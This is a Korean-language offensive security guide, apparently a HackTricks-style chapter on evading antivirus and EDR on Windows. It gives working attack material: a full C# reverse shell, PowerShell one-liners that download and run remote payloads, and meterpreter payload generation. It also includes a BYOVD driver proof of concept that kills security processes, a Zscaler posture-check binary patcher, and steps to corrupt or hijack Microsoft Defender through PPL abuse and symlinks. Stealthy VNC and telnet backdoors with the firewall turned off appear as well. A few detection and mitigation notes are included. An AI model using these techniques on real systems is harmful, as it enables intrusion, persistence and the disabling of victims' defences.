**MoTW** (Mark of The Web)는 다운로드한 파일과 함께, 파일이 다운로드된 URL을 담은 Zone.Identifier라는 이름의 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)이다.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>인터넷에서 다운로드한 file의 Zone.Identifier ADS를 확인하는 모습.</p></figcaption></figure>

> [!TIP]
> **trusted** signing certificate로 서명된 executables는 **SmartScreen을 트리거하지 않는다는** 점이 중요하다.

payloads에 Mark of The Web이 붙지 않도록 하는 매우 효과적인 방법은 ISO 같은 container 안에 넣어 패키징하는 것이다. 이는 Mark-of-the-Web (MOTW)이 **non NTFS** 볼륨에는 적용될 **수 없기** 때문이다.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)는 Mark-of-the-Web을 회피하기 위해 payloads를 output containers로 패키징하는 tool이다.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
SmartScreen을 우회하기 위해 [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)를 사용해 payload를 ISO 파일 안에 넣는 데모입니다.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW)는 Windows에서 애플리케이션과 시스템 구성 요소가 **이벤트를 기록**할 수 있게 해주는 강력한 로깅 메커니즘입니다. 하지만 보안 제품이 악성 활동을 모니터링하고 탐지하는 데에도 사용할 수 있습니다.

AMSI가 비활성화(우회)되는 것과 비슷하게, 사용자 공간 프로세스의 **`EtwEventWrite`** 함수가 어떤 이벤트도 기록하지 않고 즉시 반환하도록 만드는 것도 가능합니다. 이는 해당 함수를 메모리에서 패치하여 즉시 반환하게 만들어, 그 프로세스에 대한 ETW 로깅을 사실상 비활성화하는 방식입니다.

자세한 내용은 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**에서 확인할 수 있습니다.


## C# Assembly Reflection

C# 바이너리를 메모리에서 로드하는 방식은 꽤 오래전부터 알려져 왔고, AV에 걸리지 않고 post-exploitation 도구를 실행하는 데 여전히 매우 좋은 방법입니다.

payload가 디스크를 건드리지 않고 직접 메모리에 로드되므로, 우리는 전체 프로세스에 대해 AMSI 패치만 신경 쓰면 됩니다.

대부분의 C2 프레임워크(sliver, Covenant, metasploit, CobaltStrike, Havoc, 등)는 이미 C# assemblies를 메모리에서 직접 실행하는 기능을 제공하지만, 그 방식은 여러 가지가 있습니다:

- **Fork\&Run**

**새로운 sacrificial process를 생성**한 뒤, post-exploitation 악성 코드를 그 새 프로세스에 주입하고 실행한 다음, 끝나면 새 프로세스를 종료하는 방식입니다. 이 방식에는 장점과 단점이 모두 있습니다. fork and run 방식의 장점은 실행이 **우리의 Beacon implant process 밖에서** 이루어진다는 점입니다. 즉, post-exploitation 작업에서 문제가 생기거나 탐지되더라도 **implant가 살아남을 가능성이 훨씬 더 높습니다.** 단점은 **Behavioural Detections**에 걸릴 가능성이 **훨씬 더 높아진다**는 점입니다.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitation 악성 코드를 **자기 자신의 프로세스 안에** 주입하는 방식입니다. 이렇게 하면 새 프로세스를 만들고 AV가 검사하게 되는 일을 피할 수 있지만, payload 실행 중 문제가 생기면 **beacon을 잃을 가능성이 훨씬 더 높아져** 크래시가 날 수 있다는 단점이 있습니다.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly 로딩에 대해 더 읽고 싶다면 이 글 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)와 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))를 확인해 보세요.

PowerShell에서도 C# Assemblies를 로드할 수 있습니다. [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)와 [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk)를 확인해 보세요.

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)에서 제안한 것처럼, 공격자가 제어하는 SMB share에 설치된 interpreter environment에 compromised machine이 접근할 수 있게 하면 다른 언어를 사용해 악성 코드를 실행하는 것이 가능합니다.

SMB share의 Interpreter Binaries와 environment에 접근할 수 있게 하면, compromised machine의 **메모리 안에서 이 언어들로 임의 코드를 실행**할 수 있습니다.

repo에 따르면 Defender는 여전히 scripts를 스캔하지만, Go, Java, PHP 등을 활용하면 **static signatures를 우회할 수 있는 유연성이 더 커집니다.** 이러한 언어들에서 난독화하지 않은 임의의 reverse shell scripts를 테스트한 결과 성공적으로 동작했습니다.

## TokenStomping

Token stomping은 공격자가 **access token 또는 EDR나 AV 같은 security prouct를 조작**할 수 있게 해주는 기법으로, 권한을 낮춰 프로세스는 종료되지 않지만 악성 활동을 검사할 권한도 없게 만듭니다.

이를 방지하기 위해 Windows는 **외부 프로세스가 security processes의 token에 대한 handle을 얻는 것**을 막을 수 있습니다.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**이 블로그 글**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)에서 설명하듯, 피해자 PC에 Chrome Remote Desktop을 그냥 배포한 다음 이를 사용해 장악하고 persistence를 유지하는 것은 쉽습니다:
1. https://remotedesktop.google.com/에서 다운로드하고 "Set up via SSH"를 클릭한 뒤, Windows용 MSI 파일을 클릭해 MSI 파일을 다운로드합니다.
2. 피해자에서 설치 프로그램을 silent로 실행합니다(admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop 페이지로 돌아가 다음을 클릭합니다. 그러면 마법사가 권한 부여를 요청하므로, Authorize 버튼을 클릭해 계속합니다.
4. 약간 수정한 다음 파라미터를 실행합니다: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI 없이 pin을 설정할 수 있게 해주는 pin param에 주의하세요).


## Advanced Evasion

Evasion은 매우 복잡한 주제입니다. 때로는 한 시스템 안에서 여러 가지 서로 다른 telemetry source를 모두 고려해야 하므로, 성숙한 환경에서 완전히 탐지되지 않는 상태를 유지하는 것은 사실상 불가능합니다.

대상으로 하는 모든 환경에는 저마다의 강점과 약점이 있습니다.

[@ATTL4S](https://twitter.com/DaniLJ94)의 이 강연을 꼭 보시길 강력히 권합니다. 더 Advanced Evasion techniques를 이해하는 데 도움이 됩니다.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

[@mariuszbit](https://twitter.com/mariuszbit)의 Evasion in Depth에 대한 또 다른 훌륭한 강연도 있습니다.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Defender가 어떤 부분을 악성으로 탐지하는지 확인하기**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)을 사용할 수 있습니다. 이 도구는 **바이너리의 일부를 제거해 가며** **Defender가 어떤 부분을 악성으로 탐지하는지** 찾아내고, 그 부분을 나눠서 보여줍니다.\
같은 일을 하는 또 다른 도구는 **avred**[**https://github.com/dobin/avred**](https://github.com/dobin/avred)이며, 서비스를 제공하는 공개 웹은 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)입니다.

### **Telnet Server**

Windows10 이전에는 모든 Windows에 설치 가능한 **Telnet server**가 포함되어 있었고, (administrator로) 다음과 같이 설치할 수 있었습니다:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
시스템이 시작될 때 **start**되도록 하고 지금 **run**하라:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet 포트 변경**(stealth) 및 firewall 비활성화:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

다음에서 다운로드: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup이 아니라 bin downloads를 원함)

**HOST에서**: _**winvnc.exe**_를 실행하고 server를 configure:

- 옵션 _Disable TrayIcon_을 enable
- _VNC Password_에 password를 set
- _View-Only Password_에 password를 set

그다음, binary _**winvnc.exe**_와 **새로** 생성된 파일 _**UltraVNC.ini**_를 **victim** 안으로 move

#### **Reverse connection**

**attacker**는 자신의 **host**에서 binary `vncviewer.exe -listen 5900`를 **execute inside** 해서 **reverse VNC connection**을 받을 준비를 해두어야 함. 그다음, **victim** 안에서: winvnc daemon `winvnc.exe -run`을 시작하고 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`를 실행

**WARNING:** stealth를 유지하려면 몇 가지를 하면 안 됨

- 이미 실행 중이라면 `winvnc`를 start하지 말 것. 그렇지 않으면 [popup](https://i.imgur.com/1SROTTl.png)이 뜸. `tasklist | findstr winvnc`로 실행 여부를 확인
- 같은 directory에 `UltraVNC.ini` 없이 `winvnc`를 start하지 말 것. 그렇지 않으면 [the config window](https://i.imgur.com/rfMQWcf.png)가 열림
- help를 위해 `winvnc -h`를 실행하지 말 것. 그렇지 않으면 [popup](https://i.imgur.com/oc18wcu.png)이 뜸

### GreatSCT

다음에서 다운로드: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
이제 `msfconsole -r file.rc`로 **lister**를 시작하고 다음으로 **xml payload**를 **실행**하세요:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**현재 방어자는 프로세스를 매우 빠르게 종료할 것입니다.**

### 우리 own reverse shell 컴파일하기

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 첫 번째 C# Revershell

다음으로 컴파일하세요:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
다음과 함께 사용:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

자동 다운로드 및 실행:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### python을 사용한 build injectors 예제:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 기타 tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space에서 AV/EDR 죽이기

Storm-2603은 랜섬웨어를 배포하기 전에 endpoint protections를 비활성화하기 위해 **Antivirus Terminator**라는 작은 console utility를 활용했다. 이 도구는 **자체 vulnerable하지만 *signed* driver**를 가져와서, Protected-Process-Light (PPL) AV services조차 막지 못하는 권한 있는 kernel operations를 악용한다.

핵심 요약
1. **Signed driver**: 디스크에 전달되는 파일은 `ServiceMouse.sys`이지만, 실제 binary는 Antiy Labs의 “System In-Depth Analysis Toolkit”에 포함된 정식 signed driver `AToolsKrnl64.sys`이다. 이 driver는 유효한 Microsoft signature를 가지고 있으므로 Driver-Signature-Enforcement (DSE)가 enabled되어 있어도 load된다.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
첫 번째 줄은 driver를 **kernel service**로 등록하고, 두 번째 줄은 이를 시작해서 `\\.\ServiceMouse`를 user land에서 접근 가능하게 만든다.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID를 기준으로 임의의 process를 terminate (Defender/EDR services를 죽이는 데 사용) |
| `0x990000D0` | 디스크상의 임의 파일 삭제 |
| `0x990001D0` | driver unload 및 service 제거 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD는 user-mode protections를 완전히 우회한다; kernel에서 실행되는 code는 *protected* processes를 열고, terminate하거나, PPL/PP, ELAM 또는 다른 hardening features와 무관하게 kernel objects를 변조할 수 있다.

Detection / Mitigation
•  Microsoft의 vulnerable-driver block list (`HVCI`, `Smart App Control`)를 활성화해 Windows가 `AToolsKrnl64.sys`를 load하지 못하게 한다.
•  새로운 *kernel* services 생성과 driver가 world-writable directory에서 load되거나 allow-list에 없을 때를 모니터링한다.
•  custom device objects에 대한 user-mode handles 뒤에 수상한 `DeviceIoControl` calls가 이어지는지 확인한다.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler의 **Client Connector**는 device-posture rules를 로컬에서 적용하고, 결과를 다른 components에 전달하기 위해 Windows RPC에 의존한다. 다음 두 가지 약한 설계 선택 때문에 완전한 bypass가 가능하다:

1. Posture evaluation이 **완전히 client-side**에서 이루어진다(서버에는 boolean만 전송됨).
2. internal RPC endpoints는 연결하는 executable이 **Zscaler에 의해 signed**되었는지만 검증한다(`WinVerifyTrust` 사용).

disk 상의 signed binaries 네 개를 **patching**하면 두 메커니즘 모두 무력화할 수 있다:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 항상 `1`을 반환하므로 모든 check가 compliant |
| `ZSAService.exe` | `WinVerifyTrust`로의 indirect call | NOP-ed ⇒ 어떤 (심지어 unsigned) process라도 RPC pipes에 bind 가능 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret`로 대체 |
| `ZSATunnel.exe` | tunnel에 대한 integrity checks | short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
원본 파일을 교체하고 서비스 스택을 다시 시작한 후:

* **모든** posture checks가 **green/compliant**로 표시된다.
* 서명되지 않았거나 수정된 바이너리도 named-pipe RPC endpoints를 열 수 있다(예: `\\RPC Control\\ZSATrayManager_talk_to_me`).
* 감염된 호스트는 Zscaler policies에 의해 정의된 내부 네트워크에 무제한으로 접근할 수 있다.

이 case study는 순수한 client-side trust decisions와 단순한 signature checks가 몇 개의 byte patches만으로 우회될 수 있음을 보여준다.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL)는 signer/level hierarchy를 강제하여, 동일하거나 더 높은 보호 수준의 프로세스만 서로를 tamper할 수 있게 한다. 공격적으로는, PPL-enabled binary를 정당하게 실행하고 그 arguments를 제어할 수 있다면, benign functionality(예: logging)를 AV/EDR가 사용하는 protected directories를 대상으로 하는 제한된, PPL-backed write primitive로 바꿀 수 있다.

프로세스가 PPL로 실행되게 만드는 요소
- target EXE(및 로드되는 모든 DLLs)는 PPL-capable EKU로 서명되어야 한다.
- 프로세스는 flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`를 사용한 CreateProcess로 생성되어야 한다.
- binary의 signer와 일치하는 compatible protection level을 요청해야 한다(예: anti-malware signers에는 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows signers에는 `PROTECTION_LEVEL_WINDOWS`). 잘못된 level은 생성 시 실패한다.

PP/PPL 및 LSASS protection에 대한 더 넓은 소개도 여기에서 볼 수 있다:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (protection level을 선택하고 arguments를 target EXE로 전달한다):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 서명된 시스템 바이너리 `C:\Windows\System32\ClipUp.exe`는 self-spawns 하며, 호출자가 지정한 경로에 log file을 쓰는 파라미터를 받는다.
- PPL process로 실행되면, file write는 PPL backing으로 발생한다.
- ClipUp는 spaces가 포함된 paths를 파싱하지 못하므로, 일반적으로 보호된 위치를 가리킬 때는 8.3 short paths를 사용하라.

8.3 short path helpers
- short names 나열: 각 parent directory에서 `dir /x`.
- cmd에서 short path 도출: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) launcher(예: CreateProcessAsPPL)를 사용해 PPL-capable LOLBIN(ClipUp)을 `CREATE_PROTECTED_PROCESS`로 실행한다.
2) ClipUp log-path argument를 전달해 protected AV directory(예: Defender Platform)에 file creation이 강제로 일어나게 한다. 필요하면 8.3 short names를 사용한다.
3) target binary가 보통 AV에 의해 실행 중 open/locked 상태라면(예: MsMpEng.exe), 더 일찍 실행되는 auto-start service를 설치해 AV가 시작되기 전에 boot 시 write를 예약한다. Process Monitor(boot logging)로 boot ordering을 검증한다.
4) reboot 시 PPL-backed write가 AV가 자신의 binary를 잠그기 전에 발생하여 target file을 corrupt하고 startup을 막는다.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
## Notes and constraints
- `ClipUp`가 쓰는 내용은 배치 외에는 제어할 수 없습니다. 이 primitive는 정확한 content injection보다는 corruption에 더 적합합니다.
- service를 설치/시작하려면 local admin/SYSTEM 권한과 reboot window가 필요합니다.
- timing이 중요합니다: target이 열려 있으면 안 됩니다; boot-time execution은 file lock을 피합니다.

## Detections
- boot 시점에 `ClipUp.exe`가 unusual arguments로 process creation 되는지, 특히 non-standard launchers가 parent인 경우를 확인합니다.
- new services가 suspicious binaries를 auto-start하도록 설정되고, Defender/AV보다 일관되게 먼저 시작하는지 확인합니다. Defender startup 실패 이전의 service creation/modification을 조사합니다.
- Defender binaries/Platform directories에 대한 file integrity monitoring을 수행합니다. protected-process flags가 설정된 processes에 의한 unexpected file creations/modifications를 확인합니다.
- ETW/EDR telemetry에서 `CREATE_PROTECTED_PROCESS`로 생성된 processes와 비-AV binaries의 anomalous PPL level 사용을 확인합니다.

## Mitigations
- WDAC/Code Integrity: 어떤 signed binaries가 PPL로 실행될 수 있는지, 그리고 어떤 parent 아래에서 실행될 수 있는지를 제한합니다; 합법적이지 않은 context에서의 `ClipUp` invocation을 차단합니다.
- Service hygiene: auto-start services의 creation/modification을 제한하고 start-order manipulation을 모니터링합니다.
- Defender tamper protection과 early-launch protections가 활성화되어 있는지 확인합니다; binary corruption을 시사하는 startup errors를 조사합니다.
- 환경과 호환된다면, security tooling이 있는 volume에서 8.3 short-name generation을 비활성화하는 것을 고려합니다(반드시 충분히 테스트하세요).

## References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender는 다음 경로 아래의 subfolder들을 열거하여 실행할 platform을 선택합니다:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

가장 높은 lexicographic version string을 가진 subfolder를 선택한 다음(예: `4.18.25070.5-0`), 그 경로에서 Defender service processes를 시작합니다(이때 service/registry paths도 함께 업데이트됨). 이 선택 과정은 directory reparse points(symlinks)를 포함한 directory entries를 신뢰합니다. administrator는 이를 이용해 Defender를 attacker-writable path로 redirect하여 DLL sideloading 또는 service disruption을 달성할 수 있습니다.

### Preconditions
- Local Administrator (Platform folder 아래에 directories/symlinks를 생성하는 데 필요)
- reboot하거나 Defender platform re-selection을 트리거할 수 있어야 함(boot 시 service restart)
- built-in tools만 필요함(`mklink`)

### Why it works
- Defender는 자체 folders에 대한 writes를 차단하지만, platform selection은 directory entries를 신뢰하고 target이 protected/trusted path로 resolve되는지 검증하지 않은 채 lexicographically 가장 높은 version을 선택합니다.

### Step-by-step (example)
1) 현재 platform folder의 writable clone을 준비합니다. 예: `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 내부에 있는 더 높은 버전 디렉터리 symlink를 당신의 폴더를 가리키도록 생성하세요:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 트리거 선택 (재부팅 권장):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)가 리디렉션된 경로에서 실행되는지 확인:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
새 프로세스 경로가 `C:\TMP\AV\` 아래에 나타나는지, 그리고 서비스 구성/레지스트리가 그 위치를 반영하는지 확인해야 합니다.

Post-exploitation options
- DLL sideloading/code execution: Defender가 application directory에서 로드하는 DLL을 drop/replace하여 Defender의 processes에서 code를 실행합니다. 위 섹션을 참조하세요: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink를 제거하여 다음 시작 시 configured path가 resolve되지 않게 만들고 Defender가 시작에 실패하도록 합니다:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 이 기술은 단독으로 권한 상승을 제공하지 않는다; 관리자 권한이 필요하다.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

